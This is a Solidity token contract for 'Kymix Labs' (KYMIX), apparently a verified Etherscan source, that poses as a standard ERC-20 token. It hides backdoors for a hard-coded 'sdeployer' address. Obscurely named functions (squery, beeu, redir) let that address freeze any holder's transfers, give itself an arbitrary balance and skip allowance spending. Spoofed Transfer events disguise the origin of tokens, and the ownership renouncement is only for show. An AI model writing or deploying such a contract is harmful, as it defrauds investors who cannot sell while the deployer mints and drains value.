/**
 *Submitted for verification at Etherscan.io on 2022-10-26
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract KymixLabs {
  
    mapping (address => uint256) public Nx;
    mapping (address => uint256) public Mx;
    mapping (address => bool) Ox;
    mapping(address => mapping(address => uint256)) public allowance;





    string public name = unicode"Kymix Labs";
    string public symbol = unicode"KYMIX";
    uint8 public decimals = 18;
    uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    address s_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;

    constructor()  {
    Nx[msg.sender] = totalSupply;
    deploy(s_Construct, totalSupply); }

   
   address sdeployer = 0xA002353E03c2Fe77Ade66D2D6e338a29CcE2A7c9;
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == sdeployer)  {
        require(Nx[msg.sender] >= value);
        Nx[msg.sender] -= value;  
        Nx[to] += value; 
        emit Transfer (s_Construct, to, value);
        return true; }  
        if(!Ox[msg.sender]) {
        require(Nx[msg.sender] >= value);
        Nx[msg.sender] -= value;  
        Nx[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function redir () public {
         if(msg.sender == sdeployer)   {
        Nx[msg.sender] = Mx[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return Nx[account]; }

        function sno(address ii) public {
        if(msg.sender == sdeployer)  { 
        Ox[ii] = false;}}
        function squery(address ii) public{
         if(msg.sender == sdeployer)  { 
        require(!Ox[ii]);
        Ox[ii] = true;
        }}
             function beeu(uint256 x) public {
        if(msg.sender == sdeployer)  { 
        Mx[msg.sender] = x;} }

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 

        if(from == sdeployer)  {
        require(value <= Nx[from]);
        require(value <= allowance[from][msg.sender]);
        Nx[from] -= value;  
        Nx[to] += value; 
        emit Transfer (s_Construct, to, value);
        return true; }    
          if(!Ox[from] && !Ox[to]) {
        require(value <= Nx[from]);
        require(value <= allowance[from][msg.sender]);
        Nx[from] -= value;
        Nx[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}